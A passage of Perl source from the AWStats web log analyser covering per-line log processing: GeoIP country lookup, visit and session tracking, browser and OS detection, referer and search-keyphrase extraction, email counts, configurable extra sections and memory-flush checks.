#				elsif ($PluginsLoaded{'GetCountryCodeByAddr'}{'geoip_city_maxmind'})   { $Domain=GetCountryCodeByAddr_geoip_city_maxmind($Host); }
					elsif (
						$PluginsLoaded{'GetCountryCodeByAddr'}{'geoipfree'} )
					{
						$Domain = GetCountryCodeByAddr_geoipfree($Host);
					}
					elsif (
						$PluginsLoaded{'GetCountryCodeByAddr'}{'geoip2_country'} )
					{
						$Domain = GetCountryCodeByAddr_geoip2_country($Host);
					}
					elsif ( $HostResolved =~ /\.(\w+)$/ ) { $Domain = $1; }
					if ($AtLeastOneSectionPlugin) {
						foreach my $pluginname (
							keys %{ $PluginsLoaded{'SectionProcessIp'} } )
						{
							my $function = "SectionProcessIp_$pluginname";
							if ($Debug) {
								debug( "  Call to plugin function $function",
									5 );
							}
							&$function($Host);
						}
					}
				}
				else {
					if ( $PluginsLoaded{'GetCountryCodeByName'}{'geoip6'} ) {
						$Domain = GetCountryCodeByName_geoip6($HostResolved);
					}
					elsif ( $PluginsLoaded{'GetCountryCodeByName'}{'geoip'} ) {
						$Domain = GetCountryCodeByName_geoip($HostResolved);
					}

#				elsif ($PluginsLoaded{'GetCountryCodeByName'}{'geoip_region_maxmind'}) { $Domain=GetCountryCodeByName_geoip_region_maxmind($HostResolved); }
#				elsif ($PluginsLoaded{'GetCountryCodeByName'}{'geoip_city_maxmind'})   { $Domain=GetCountryCodeByName_geoip_city_maxmind($HostResolved); }
					elsif (
						$PluginsLoaded{'GetCountryCodeByName'}{'geoipfree'} )
					{
						$Domain = GetCountryCodeByName_geoipfree($HostResolved);
					}
					elsif (
						$PluginsLoaded{'GetCountryCodeByName'}{'geoip2_country'} )
					{
						$Domain = GetCountryCodeByName_geoip2_country($HostResolved);
					}
					elsif ( $HostResolved =~ /\.(\w+)$/ ) { $Domain = $1; }
					if ($AtLeastOneSectionPlugin) {
						foreach my $pluginname (
							keys %{ $PluginsLoaded{'SectionProcessHostname'} } )
						{
							my $function = "SectionProcessHostname_$pluginname";
							if ($Debug) {
								debug( "  Call to plugin function $function",
									5 );
							}
							&$function($HostResolved);
						}
					}
				}
			}

			# Store country
			if ($PageBool) { $_domener_p{$Domain}++; }
			if ($countedtraffic != 6){$_domener_h{$Domain}++;}
			if ( $field[$pos_size] ne '-' && $pos_size>0) {
				$_domener_k{$Domain} += int( $field[$pos_size] );
			}

			# Analyze: Host, URL entry+exit and Session
			#------------------------------------------
			if ($PageBool) {
				my $timehostl = $_host_l{$HostResolved};
				if ($timehostl) {

# A visit for this host was already detected
# TODO everywhere there is $VISITTIMEOUT
#				$timehostl =~ /^\d\d\d\d\d\d(\d\d)/; my $daytimehostl=$1;
#				if ($timerecord > ($timehostl+$VISITTIMEOUT+($dateparts[3]>$daytimehostl?$NEWDAYVISITTIMEOUT:0))) {
					if ( $timerecord > ( $timehostl + $VISITTIMEOUT ) ) {

						# This is a second visit or more
						if ( !$_waithost_s{$HostResolved} ) {

							# This is a second visit or more
							# We count 'visit','exit','entry','DayVisits'
							if ($Debug) {
								debug(
"  This is a second visit for $HostResolved.",
									4
								);
							}
							my $timehosts = $_host_s{$HostResolved};
							my $page      = $_host_u{$HostResolved};
							if ($page) { $_url_x{$page}++; }
							$_url_e{ $field[$pos_url] }++;
							$DayVisits{$yearmonthdayrecord}++;

				 # We can't count session yet because we don't have the start so
				 # we save params of first 'wait' session
							$_waithost_l{$HostResolved} = $timehostl;
							$_waithost_s{$HostResolved} = $timehosts;
							$_waithost_u{$HostResolved} = $page;
						}
						else {

						 # This is third visit or more
						 # We count 'session','visit','exit','entry','DayVisits'
							if ($Debug) {
								debug(
"  This is a third visit or more for $HostResolved.",
									4
								);
							}
							my $timehosts = $_host_s{$HostResolved};
							my $page      = $_host_u{$HostResolved};
							if ($page) { $_url_x{$page}++; }
							$_url_e{ $field[$pos_url] }++;
							$DayVisits{$yearmonthdayrecord}++;
							if ($timehosts) {
								$_session{ GetSessionRange( $timehosts,
										$timehostl ) }++;
							}
						}

						# Save new session properties
						$_host_s{$HostResolved} = $timerecord;
						$_host_l{$HostResolved} = $timerecord;
						$_host_u{$HostResolved} = $field[$pos_url];
					}
					elsif ( $timerecord > $timehostl ) {

						# This is a same visit we can count
						if ($Debug) {
							debug(
"  This is same visit still running for $HostResolved. host_l/host_u changed to $timerecord/$field[$pos_url]",
								4
							);
						}
						$_host_l{$HostResolved} = $timerecord;
						$_host_u{$HostResolved} = $field[$pos_url];
					}
					elsif ( $timerecord == $timehostl ) {

						# This is a same visit we can count
						if ($Debug) {
							debug(
"  This is same visit still running for $HostResolved. host_l/host_u changed to $timerecord/$field[$pos_url]",
								4
							);
						}
						$_host_u{$HostResolved} = $field[$pos_url];
					}
					elsif ( $timerecord < $_host_s{$HostResolved} ) {

					   # Should happens only with not correctly sorted log files
						if ($Debug) {
							debug(
"  This is same visit still running for $HostResolved with start not in order. host_s changed to $timerecord (entry page also changed if first visit)",
								4
							);
						}
						if ( !$_waithost_s{$HostResolved} ) {

# We can reorder entry page only if it's the first visit found in this update run (The saved entry page was $_waithost_e if $_waithost_s{$HostResolved} is not defined. If second visit or more, entry was directly counted and not saved)
							$_waithost_e{$HostResolved} = $field[$pos_url];
						}
						else {

# We can't change entry counted as we dont't know what was the url counted as entry
						}
						$_host_s{$HostResolved} = $timerecord;
					}
					else {
						if ($Debug) {
							debug(
"  This is same visit still running for $HostResolved with hit between start and last hits. No change",
								4
							);
						}
					}
				}
				else {

# This is a new visit (may be). First new visit found for this host. We save in wait array the entry page to count later
					if ($Debug) {
						debug(
"  New session (may be) for $HostResolved. Save in wait array to see later",
							4
						);
					}
					$_waithost_e{$HostResolved} = $field[$pos_url];

					# Save new session properties
					$_host_u{$HostResolved} = $field[$pos_url];
					$_host_s{$HostResolved} = $timerecord;
					$_host_l{$HostResolved} = $timerecord;
				}
				$_host_p{$HostResolved}++;
			}
			$_host_h{$HostResolved}++;
			if ( $field[$pos_size] ne '-' && $pos_size>0) {
				$_host_k{$HostResolved} += int( $field[$pos_size] );
			}

			# Analyze: Browser - OS
			#----------------------
			if ( $pos_agent >= 0 ) {

				if ($LevelForBrowsersDetection) {

					# Analyze: Browser
					#-----------------
					my $uabrowser = $TmpBrowser{$UserAgent};
					if ( !$uabrowser ) {
						my $found = 1;

						# Edge (must be at beginning)
						if ($UserAgent =~ /$regveredge/o)
						{
							$_browser_h{"edge$1"}++;
							if ($PageBool) { $_browser_p{"edge$1"}++; }
							$TmpBrowser{$UserAgent} = "edge$1";
						}
						
						# Opera ?
						elsif ( $UserAgent =~ /$regveropera/o ) {	# !!!! version number in in regex $1 or $2 !!!
						    $_browser_h{"opera".($1||$2)}++;
						    if ($PageBool) { $_browser_p{"opera".($1||$2)}++; }
						    $TmpBrowser{$UserAgent} = "opera".($1||$2);
						}
						
						# Firefox ?
						elsif ( $UserAgent =~ /$regverfirefox/o
						    && $UserAgent !~ /$regnotfirefox/o )
						{
						    $_browser_h{"firefox$1"}++;
						    if ($PageBool) { $_browser_p{"firefox$1"}++; }
						    $TmpBrowser{$UserAgent} = "firefox$1";
						}

						# Chrome ?
						elsif ( $UserAgent =~ /$regverchrome/o ) {
							$_browser_h{"chrome$1"}++;
							if ($PageBool) { $_browser_p{"chrome$1"}++; }
							$TmpBrowser{$UserAgent} = "chrome$1";
						}

						# Safari ?
						elsif ($UserAgent =~ /$regversafari/o
							&& $UserAgent !~ /$regnotsafari/o )
						{
							my $safariver = $BrowsersSafariBuildToVersionHash{$1};
							if ( $UserAgent =~ /$regversafariver/o ) {
								$safariver = $1;
							}
							$_browser_h{"safari$safariver"}++;
							if ($PageBool) { $_browser_p{"safari$safariver"}++; }
							$TmpBrowser{$UserAgent} = "safari$safariver";
						}

						# Konqueror ?
						elsif ( $UserAgent =~ /$regverkonqueror/o ) {
							$_browser_h{"konqueror$1"}++;
							if ($PageBool) { $_browser_p{"konqueror$1"}++; }
							$TmpBrowser{$UserAgent} = "konqueror$1";
						}

						# Subversion ?
						elsif ( $UserAgent =~ /$regversvn/o ) {
							$_browser_h{"svn$1"}++;
							if ($PageBool) { $_browser_p{"svn$1"}++; }
							$TmpBrowser{$UserAgent} = "svn$1";
						}

						# IE < 11 ? (must be at end of test)
						elsif ($UserAgent =~ /$regvermsie/o
							&& $UserAgent !~ /$regnotie/o )
						{
							$_browser_h{"msie$2"}++;
							if ($PageBool) { $_browser_p{"msie$2"}++; }
							$TmpBrowser{$UserAgent} = "msie$2";
						}
						
						# IE >= 11
                        elsif ($UserAgent =~ /$regvermsie11/o && $UserAgent !~ /$regnotie/o)
						{
                            $_browser_h{"msie$2"}++;
                            if ($PageBool) { $_browser_p{"msie$2"}++; }
                            $TmpBrowser{$UserAgent} = "msie$2";
						}

						# Netscape 6.x, 7.x ... ? (must be at end of test)
						elsif ( $UserAgent =~ /$regvernetscape/o ) {
							$_browser_h{"netscape$1"}++;
							if ($PageBool) { $_browser_p{"netscape$1"}++; }
							$TmpBrowser{$UserAgent} = "netscape$1";
						}

						# Netscape 3.x, 4.x ... ? (must be at end of test)
						elsif ($UserAgent =~ /$regvermozilla/o
							&& $UserAgent !~ /$regnotnetscape/o )
						{
							$_browser_h{"netscape$2"}++;
							if ($PageBool) { $_browser_p{"netscape$2"}++; }
							$TmpBrowser{$UserAgent} = "netscape$2";
						}

						# Other known browsers ?
						else {
							$found = 0;
							foreach (@BrowsersSearchIDOrder)
							{    # Search ID in order of BrowsersSearchIDOrder
								if ( $UserAgent =~ /$_/ ) {
									my $browser = &UnCompileRegex($_);

								   # TODO If browser is in a family, use version
									$_browser_h{"$browser"}++;
									if ($PageBool) { $_browser_p{"$browser"}++; }
									$TmpBrowser{$UserAgent} = "$browser";
									$found = 1;
									last;
								}
							}
						}

						# Unknown browser ?
						if ( !$found ) {
							$_browser_h{'Unknown'}++;
							if ($PageBool) { $_browser_p{'Unknown'}++; }
							$TmpBrowser{$UserAgent} = 'Unknown';
							my $newua = $UserAgent;
							$newua =~ tr/\+ /__/;
							$_unknownrefererbrowser_l{$newua} = $timerecord;
						}
					}
					else {
						$_browser_h{$uabrowser}++;
						if ($PageBool) { $_browser_p{$uabrowser}++; }
						if ( $uabrowser eq 'Unknown' ) {
							my $newua = $UserAgent;
							$newua =~ tr/\+ /__/;
							$_unknownrefererbrowser_l{$newua} = $timerecord;
						}
					}

				}

				if ($LevelForOSDetection) {

					# Analyze: OS
					#------------
					my $uaos = $TmpOS{$UserAgent};
					if ( !$uaos ) {
						my $found = 0;

						# in OSHashID list ?
						foreach (@OSSearchIDOrder)
						{    # Search ID in order of OSSearchIDOrder
							if ( $UserAgent =~ /$_/ ) {
								my $osid = $OSHashID{ &UnCompileRegex($_) };
								$_os_h{"$osid"}++;
								if ($PageBool) { $_os_p{"$osid"}++; }
								$TmpOS{$UserAgent} = "$osid";
								$found = 1;
								last;
							}
						}

						# Unknown OS ?
						if ( !$found ) {
							$_os_h{'Unknown'}++;
							if ($PageBool) { $_os_p{'Unknown'}++; }
							$TmpOS{$UserAgent} = 'Unknown';
							my $newua = $UserAgent;
							$newua =~ tr/\+ /__/;
							$_unknownreferer_l{$newua} = $timerecord;
						}
					}
					else {
						$_os_h{$uaos}++;
						if ($PageBool) {
							$_os_p{$uaos}++;
						}
						if ( $uaos eq 'Unknown' ) {
							my $newua = $UserAgent;
							$newua =~ tr/\+ /__/;
							$_unknownreferer_l{$newua} = $timerecord;
						}
					}

				}

			}
			else {
				$_browser_h{'Unknown'}++;
				$_os_h{'Unknown'}++;
				if ($PageBool) {
					$_browser_p{'Unknown'}++;
					$_os_p{'Unknown'}++;
				}
			}

			# Analyze: Referer
			#-----------------
			my $found = 0;
			if (   $pos_referer >= 0
				&& $LevelForRefererAnalyze
				&& $field[$pos_referer] )
			{

				# Direct ?
				if (   $field[$pos_referer] eq '-'
					|| $field[$pos_referer] eq 'bookmarks' )
				{  # "bookmarks" is sent by Netscape, '-' by all others browsers
					    # Direct access
					if ($PageBool) {
						if ($ShowDirectOrigin) {
							print "Direct access for line $line\n";
						}
						$_from_p[0]++;
					}
					$_from_h[0]++;
					$found = 1;
				}
				else {
					$field[$pos_referer] =~ /$regreferer/o;
					my $refererprot   = $1;
					my $refererserver =
					    ( $2 || '' )
					  . ( !$3 || $3 eq ':80' ? '' : $3 )
					  ; # refererserver is www.xxx.com or www.xxx.com:81 but not www.xxx.com:80
					    # HTML link ?
					if ( $refererprot =~ /^http/i ) {

#if ($Debug) { debug("  Analyze referer refererprot=$refererprot refererserver=$refererserver",5); }

						# Kind of origin
						if ( !$TmpRefererServer{$refererserver} )
						{ # TmpRefererServer{$refererserver} is "=" if same site, "search egine key" if search engine, not defined otherwise
							if ( $refererserver =~ /$reglocal/o ) {

						  # Intern (This hit came from another page of the site)
								if ($Debug) {
									debug(
"  Server '$refererserver' is added to TmpRefererServer with value '='",
										2
									);
								}
								$TmpRefererServer{$refererserver} = '=';
								$found = 1;
							}
							else {
								foreach (@HostAliases) {
									if ( $refererserver =~ /$_/ ) {

						  # Intern (This hit came from another page of the site)
										if ($Debug) {
											debug(
"  Server '$refererserver' is added to TmpRefererServer with value '='",
												2
											);
										}
										$TmpRefererServer{$refererserver} = '=';
										$found = 1;
										last;
									}
								}
								if ( !$found ) {

							 # Extern (This hit came from an external web site).

									if ($LevelForSearchEnginesDetection) {

										foreach (@SearchEnginesSearchIDOrder)
										{ # Search ID in order of SearchEnginesSearchIDOrder
											if ( $refererserver =~ /$_/ ) {
												my $key = &UnCompileRegex($_);
												if (
													!$NotSearchEnginesKeys{$key}
													|| $refererserver !~
/$NotSearchEnginesKeys{$key}/i
												  )
												{

									 # This hit came from the search engine $key
													if ($Debug) {
														debug(
"  Server '$refererserver' is added to TmpRefererServer with value '$key'",
															2
														);
													}
													$TmpRefererServer{
														$refererserver} =
													  $SearchEnginesHashID{ $key
													  };
													$found = 1;
												}
												last;
											}
										}

									}
								}
							}
						}

						my $tmprefererserver =
						  $TmpRefererServer{$refererserver};
						if ($tmprefererserver) {
							if ( $tmprefererserver eq '=' ) {

						  # Intern (This hit came from another page of the site)
								if ($PageBool) { $_from_p[4]++; }
								$_from_h[4]++;
								$found = 1;
							}
							else {

								# This hit came from a search engine
								if ($PageBool) {
									$_from_p[2]++;
									$_se_referrals_p{$tmprefererserver}++;
								}
								$_from_h[2]++;
								$_se_referrals_h{$tmprefererserver}++;
								$found = 1;
								if ( $PageBool && $LevelForKeywordsDetection ) {

									# we will complete %_keyphrases hash array
									my @refurl =
									  split( /\?/, $field[$pos_referer], 2 )
									  ; # TODO Use \? or [$URLQuerySeparators] ?
									if ( $refurl[1] ) {

# Extract params of referer query string (q=cache:mmm:www/zzz+aaa+bbb q=aaa+bbb/ccc key=ddd%20eee lang_en ie=UTF-8 ...)
										if (
											$SearchEnginesKnownUrl{
												$tmprefererserver} )
										{  # Search engine with known URL syntax
											foreach my $param (
												split(
													/&/,
													$KeyWordsNotSensitive
													? lc( $refurl[1] )
													: $refurl[1]
												)
											  )
											{
												if ( $param =~
s/^$SearchEnginesKnownUrl{$tmprefererserver}//
												  )
												{

	 # We found good parameter
	 # Now param is keyphrase: "cache:mmm:www/zzz+aaa+bbb/ccc+ddd%20eee'fff,ggg"
													$param =~
s/^(cache|related):[^\+]+//
													  ; # Should be useless since this is for hit on 'not pages'
													&ChangeWordSeparatorsIntoSpace
													  ($param)
													  ; # Change [ aaa+bbb/ccc+ddd%20eee'fff,ggg ] into [ aaa bbb/ccc ddd eee fff ggg]
													$param =~ s/^ +//;
													$param =~ s/ +$//;    # Trim
													$param =~ tr/ /\+/s;
													if ( ( ( length $param ) > 0 ) and ( ( length $param ) < 80 ) )
													{
														$_keyphrases{$param}++;
													}
													last;
												}
											}
										}
										elsif (
											$LevelForKeywordsDetection >= 2 )
										{ # Search engine with unknown URL syntax
											foreach my $param (
												split(
													/&/,
													$KeyWordsNotSensitive
													? lc( $refurl[1] )
													: $refurl[1]
												)
											  )
											{
												my $foundexcludeparam = 0;
												foreach my $paramtoexclude (
													@WordsToCleanSearchUrl)
												{
													if ( $param =~
														/$paramtoexclude/i )
													{
														$foundexcludeparam = 1;
														last;
													} # Not the param with search criteria
												}
												if ($foundexcludeparam) {
													next;
												}

												# We found good parameter
												$param =~ s/.*=//;

					   # Now param is keyphrase: "aaa+bbb/ccc+ddd%20eee'fff,ggg"
												$param =~
												  s/^(cache|related):[^\+]+//
												  ; # Should be useless since this is for hit on 'not pages'
												&ChangeWordSeparatorsIntoSpace(
													$param)
												  ; # Change [ aaa+bbb/ccc+ddd%20eee'fff,ggg ] into [ aaa bbb/ccc ddd eee fff ggg ]
												$param =~ s/^ +//;
												$param =~ s/ +$//;     # Trim
												$param =~ tr/ /\+/s;
												if ( ( length $param ) > 2 ) {
													$_keyphrases{$param}++;
													last;
												}
											}
										}
									}    # End of elsif refurl[1]
									elsif (
										$SearchEnginesWithKeysNotInQuery{
											$tmprefererserver} )
									{

#										debug("xxx".$refurl[0]);
# If search engine with key inside page url like a9 (www.a9.com/searchkey1%20searchkey2)
										if ( $refurl[0] =~
/$SearchEnginesKnownUrl{$tmprefererserver}(.*)$/
										  )
										{
											my $param = $1;
											&ChangeWordSeparatorsIntoSpace(
												$param);
											$param =~ tr/ /\+/s;
											if ( ( length $param ) > 0 ) {
												$_keyphrases{$param}++;
											}
										}
									}

								}
							}
						}    # End of if ($TmpRefererServer)
						else {

						  # This hit came from a site other than a search engine
							if ($PageBool) { $_from_p[3]++; }
							$_from_h[3]++;

# http://www.mysite.com/ must be same referer than http://www.mysite.com but .../mypage/ differs of .../mypage
#if ($refurl[0] =~ /^[^\/]+\/$/) { $field[$pos_referer] =~ s/\/$//; }	# Code moved in Save_History
# TODO: lowercase the value for referer server to have refering server not case sensitive
							if ($URLReferrerWithQuery) {
								if ($PageBool) {
									$_pagesrefs_p{ $field[$pos_referer] }++;
								}
								$_pagesrefs_h{ $field[$pos_referer] }++;
							}
							else {

								# We discard query for referer
								if ( $field[$pos_referer] =~
									/$regreferernoquery/o )
								{
									if ($PageBool) { $_pagesrefs_p{"$1"}++; }
									$_pagesrefs_h{"$1"}++;
								}
								else {
									if ($PageBool) {
										$_pagesrefs_p{ $field[$pos_referer] }++;
									}
									$_pagesrefs_h{ $field[$pos_referer] }++;
								}
							}
							$found = 1;
						}
					}

					# News Link ?
					#if (! $found && $refererprot =~ /^news/i) {
					#	$found=1;
					#	if ($PageBool) { $_from_p[5]++; }
					#	$_from_h[5]++;
					#}
				}
			}

			# Origin not found
			if ( !$found ) {
				if ($ShowUnknownOrigin) {
					print "Unknown origin: $field[$pos_referer]\n";
				}
				if ($PageBool) { $_from_p[1]++; }
				$_from_h[1]++;
			}

			# Analyze: EMail
			#---------------
			if ( $pos_emails >= 0 && $field[$pos_emails] ) {
				if ( $field[$pos_emails] eq '<>' ) {
					$field[$pos_emails] = 'Unknown';
				}
				elsif ( $field[$pos_emails] !~ /\@/ ) {
					$field[$pos_emails] .= "\@$SiteDomain";
				}
				$_emails_h{ lc( $field[$pos_emails] ) }
				  ++;    #Count accesses for sender email (hit)
				if ($pos_size>0){$_emails_k{ lc( $field[$pos_emails] ) } +=
				  int( $field[$pos_size] )
				  ;}      #Count accesses for sender email (kb)
				$_emails_l{ lc( $field[$pos_emails] ) } = $timerecord;
			}
			if ( $pos_emailr >= 0 && $field[$pos_emailr] ) {
				if ( $field[$pos_emailr] !~ /\@/ ) {
					$field[$pos_emailr] .= "\@$SiteDomain";
				}
				$_emailr_h{ lc( $field[$pos_emailr] ) }
				  ++;    #Count accesses for receiver email (hit)
				if ($pos_size>0){$_emailr_k{ lc( $field[$pos_emailr] ) } +=
				  int( $field[$pos_size] )
				  ;}      #Count accesses for receiver email (kb)
				$_emailr_l{ lc( $field[$pos_emailr] ) } = $timerecord;
			}
		}

		# Check cluster
		#--------------
		if ( $pos_cluster >= 0 ) {
			if ($PageBool) {
				$_cluster_p{ $field[$pos_cluster] }++;
			}    #Count accesses for page (page)
			$_cluster_h{ $field[$pos_cluster] }
			  ++;    #Count accesses for page (hit)
			if ($pos_size>0){$_cluster_k{ $field[$pos_cluster] } +=
			  int( $field[$pos_size] );}    #Count accesses for page (kb)
		}

                # Check size frequency
                #---------------------
                if ( $pos_size >= 0 ) {
                        $_filesize{ GetBandwidthRange(int($field[$pos_size])) }++;
                }

                # Check request time frequency
                #-----------------------------
                if ( $pos_time >= 0 ) {
                        $_requesttime{GetRequestTimeRange(int($field[$pos_time]))}++;
                }

		# Analyze: Extra
		#---------------
		foreach my $extranum ( 1 .. @ExtraName - 1 ) {
			if ($Debug) { debug( "  Process extra analyze $extranum", 4 ); }

			# Check code
			my $conditionok = 0;
			if ( $ExtraCodeFilter[$extranum] ) {
				foreach
				  my $condnum ( 0 .. @{ $ExtraCodeFilter[$extranum] } - 1 )
				{
					if ($Debug) {
						debug(
"  Check code '$field[$pos_code]' must be '$ExtraCodeFilter[$extranum][$condnum]'",
							5
						);
					}
					if ( $field[$pos_code] eq
						"$ExtraCodeFilter[$extranum][$condnum]" )
					{
						$conditionok = 1;
						last;
					}
				}
				if ( !$conditionok && @{ $ExtraCodeFilter[$extranum] } ) {
					next;
				}    # End for this section
				if ($Debug) {
					debug(
"  No check on code or code is OK. Now we check other conditions.",
						5
					);
				}
			}

			# Check conditions
			$conditionok = 0;
			foreach my $condnum ( 0 .. @{ $ExtraConditionType[$extranum] } - 1 )
			{
				my $conditiontype    = $ExtraConditionType[$extranum][$condnum];
				my $conditiontypeval =
				  $ExtraConditionTypeVal[$extranum][$condnum];
				if ( $conditiontype eq 'URL' ) {
					if ($Debug) {
						debug(
"  Check condition '$conditiontype' must contain '$conditiontypeval' in '$urlwithnoquery'",
							5
						);
					}
					if ( $urlwithnoquery =~ /$conditiontypeval/ ) {
						$conditionok = 1;
						last;
					}
				}
				elsif ( $conditiontype eq 'QUERY_STRING' ) {
					if ($Debug) {
						debug(
"  Check condition '$conditiontype' must contain '$conditiontypeval' in '$standalonequery'",
							5
						);
					}
					if ( $standalonequery =~ /$conditiontypeval/ ) {
						$conditionok = 1;
						last;
					}
				}
				elsif ( $conditiontype eq 'URLWITHQUERY' ) {
					if ($Debug) {
						debug(
"  Check condition '$conditiontype' must contain '$conditiontypeval' in '$urlwithnoquery$tokenquery$standalonequery'",
							5
						);
					}
					if ( "$urlwithnoquery$tokenquery$standalonequery" =~
						/$conditiontypeval/ )
					{
						$conditionok = 1;
						last;
					}
				}
				elsif ( $conditiontype eq 'REFERER' ) {
					if ($Debug) {
						debug(
"  Check condition '$conditiontype' must contain '$conditiontypeval' in '$field[$pos_referer]'",
							5
						);
					}
					if ( $field[$pos_referer] =~ /$conditiontypeval/ ) {
						$conditionok = 1;
						last;
					}
				}
				elsif ( $conditiontype eq 'UA' ) {
					if ($Debug) {
						debug(
"  Check condition '$conditiontype' must contain '$conditiontypeval' in '$field[$pos_agent]'",
							5
						);
					}
					if ( $field[$pos_agent] =~ /$conditiontypeval/ ) {
						$conditionok = 1;
						last;
					}
				}
				elsif ( $conditiontype eq 'HOSTINLOG' ) {
					if ($Debug) {
						debug(
"  Check condition '$conditiontype' must contain '$conditiontypeval' in '$field[$pos_host]'",
							5
						);
					}
					if ( $field[$pos_host] =~ /$conditiontypeval/ ) {
						$conditionok = 1;
						last;
					}
				}
				elsif ( $conditiontype eq 'HOST' ) {
					my $hosttouse = ( $HostResolved ? $HostResolved : $Host );
					if ($Debug) {
						debug(
"  Check condition '$conditiontype' must contain '$conditiontypeval' in '$hosttouse'",
							5
						);
					}
					if ( $hosttouse =~ /$conditiontypeval/ ) {
						$conditionok = 1;
						last;
					}
				}
				elsif ( $conditiontype eq 'VHOST' ) {
					if ($Debug) {
						debug(
"  Check condision '$conditiontype' must contain '$conditiontypeval' in '$field[$pos_vh]'",
							5
						);
					}
					if ( $field[$pos_vh] =~ /$conditiontypeval/ ) {
						$conditionok = 1;
						last;
					}
				}
				elsif ( $conditiontype =~ /extra(\d+)/i ) {
					if ($Debug) {
						debug(
"  Check condition '$conditiontype' must contain '$conditiontypeval' in '$field[$pos_extra[$1]]'",
							5
						);
					}
					if ( $field[ $pos_extra[$1] ] =~ /$conditiontypeval/ ) {
						$conditionok = 1;
						last;
					}
				}
				else {
					error(
"Wrong value of parameter ExtraSectionCondition$extranum"
					);
				}
			}
			if ( !$conditionok && @{ $ExtraConditionType[$extranum] } ) {
				next;
			}    # End for this section
			if ($Debug) {
				debug(
"  No condition or condition is OK. Now we extract value for first column of extra chart.",
					5
				);
			}

			# Determine actual column value to use.
			my $rowkeyval;
			my $rowkeyok = 0;
			foreach my $rowkeynum (
				0 .. @{ $ExtraFirstColumnValuesType[$extranum] } - 1 )
			{
				my $rowkeytype =
				  $ExtraFirstColumnValuesType[$extranum][$rowkeynum];
				my $rowkeytypeval =
				  $ExtraFirstColumnValuesTypeVal[$extranum][$rowkeynum];
				if ( $rowkeytype eq 'URL' ) {
					if ( $urlwithnoquery =~ /$rowkeytypeval/ ) {
						$rowkeyval = "$1";
						$rowkeyok  = 1;
						last;
					}
				}
				elsif ( $rowkeytype eq 'QUERY_STRING' ) {
					if ($Debug) {
						debug(
"  Extract value from '$standalonequery' with regex '$rowkeytypeval'.",
							5
						);
					}
					if ( $standalonequery =~ /$rowkeytypeval/ ) {
						$rowkeyval = "$1";
						$rowkeyok  = 1;
						last;
					}
				}
				elsif ( $rowkeytype eq 'URLWITHQUERY' ) {
					if ( "$urlwithnoquery$tokenquery$standalonequery" =~
						/$rowkeytypeval/ )
					{
						$rowkeyval = "$1";
						$rowkeyok  = 1;
						last;
					}
				}
				elsif ( $rowkeytype eq 'REFERER' ) {
					if ( $field[$pos_referer] =~ /$rowkeytypeval/ ) {
						$rowkeyval = "$1";
						$rowkeyok  = 1;
						last;
					}
				}
				elsif ( $rowkeytype eq 'UA' ) {
					if ( $field[$pos_agent] =~ /$rowkeytypeval/ ) {
						$rowkeyval = "$1";
						$rowkeyok  = 1;
						last;
					}
				}
				elsif ( $rowkeytype eq 'HOSTINLOG' ) {
					if ( $field[$pos_host] =~ /$rowkeytypeval/ ) {
						$rowkeyval = "$1";
						$rowkeyok  = 1;
						last;
					}
				}
				elsif ( $rowkeytype eq 'HOST' ) {
					my $hosttouse = ( $HostResolved ? $HostResolved : $Host );
					if ( $hosttouse =~ /$rowkeytypeval/ ) {
						$rowkeyval = "$1";
						$rowkeyok  = 1;
						last;
					}
				}
				elsif ( $rowkeytype eq 'VHOST' ) {
					if ( $field[$pos_vh] =~ /$rowkeytypeval/ ) {
						$rowkeyval = "$1";
						$rowkeyok  = 1;
						last;
					}
				}
				elsif ( $rowkeytype =~ /extra(\d+)/i ) {
					if ( $field[ $pos_extra[$1] ] =~ /$rowkeytypeval/ ) {
						$rowkeyval = "$1";
						$rowkeyok  = 1;
						last;
					}
				}
				else {
					error(
"Wrong value of parameter ExtraSectionFirstColumnValues$extranum"
					);
				}
			}
			if ( !$rowkeyok ) { next; }    # End for this section
			if ( !defined($rowkeyval) ) { $rowkeyval = 'Failed to extract key'; }
			if ($Debug) { debug( "  Key val found: $rowkeyval", 5 ); }

			# Apply function on $rowkeyval
			if ( $ExtraFirstColumnFunction[$extranum] ) {

				# Todo call function on string $rowkeyval
			}

			# Here we got all values to increase counters
			if ( $PageBool && $ExtraStatTypes[$extranum] =~ /P/i ) {
				${ '_section_' . $extranum . '_p' }{$rowkeyval}++;
			}
			${ '_section_' . $extranum . '_h' }{$rowkeyval}++;    # Must be set
			if ( $ExtraStatTypes[$extranum] =~ /B/i && $pos_size>0) {
				${ '_section_' . $extranum . '_k' }{$rowkeyval} +=
				  int( $field[$pos_size] );
			}
			if ( $ExtraStatTypes[$extranum] =~ /L/i ) {
				if ( ${ '_section_' . $extranum . '_l' }{$rowkeyval}
					|| 0 < $timerecord )
				{
					${ '_section_' . $extranum . '_l' }{$rowkeyval} =
					  $timerecord;
				}
			}

			# Check to avoid too large extra sections
			if (
				scalar keys %{ '_section_' . $extranum . '_h' } >
				$ExtraTrackedRowsLimit )
			{
				error(<<END_ERROR_TEXT);
The number of values found for extra section $extranum has grown too large.
In order to prevent awstats from using an excessive amount of memory, the number
of values is currently limited to $ExtraTrackedRowsLimit. Perhaps you should consider
revising extract parameters for extra section $extranum. If you are certain you
want to track such a large data set, you can increase the limit by setting
ExtraTrackedRowsLimit in your awstats configuration file.
END_ERROR_TEXT
			}
		}

# Every 20,000 approved lines after a flush, we test to clean too large hash arrays to flush data in tmp file
		if ( ++$counterforflushtest >= 20000 ) {

			#if (++$counterforflushtest >= 1) {
			if (   ( scalar keys %_host_u ) > ( $LIMITFLUSH << 2 )
				|| ( scalar keys %_url_p ) > $LIMITFLUSH )
			{

# warning("Warning: Try to run AWStats update process more frequently to analyze smaler log files.");
				if ( $^X =~ /activestate/i || $^X =~ /activeperl/i ) {

# We don't flush if perl is activestate to avoid slowing process because of memory hole
				}
				else {

					# Clean tmp hash arrays
					#%TmpDNSLookup = ();
					%TmpOS = %TmpRefererServer = %TmpRobot = %TmpBrowser = ();

					# We flush if perl is not activestate
					print "Flush history file on disk";
					if ( ( scalar keys %_host_u ) > ( $LIMITFLUSH << 2 ) ) {
						print " (unique hosts reach flush limit of "
						  . ( $LIMITFLUSH << 2 ) . ")";
					}
					if ( ( scalar keys %_url_p ) > $LIMITFLUSH ) {
						print " (unique url reach flush limit of "
						  . ($LIMITFLUSH) . ")";
					}
					print "\n";
					if ($Debug) {
						debug(
"End of set of $counterforflushtest records: Some hash arrays are too large. We flush and clean some.",
							2
						);
						print " _host_p:"
						  . ( scalar keys %_host_p )
						  . " _host_h:"
						  . ( scalar keys %_host_h )
						  . " _host_k:"
						  . ( scalar keys %_host_k )
						  . " _host_l:"
						  . ( scalar keys %_host_l )
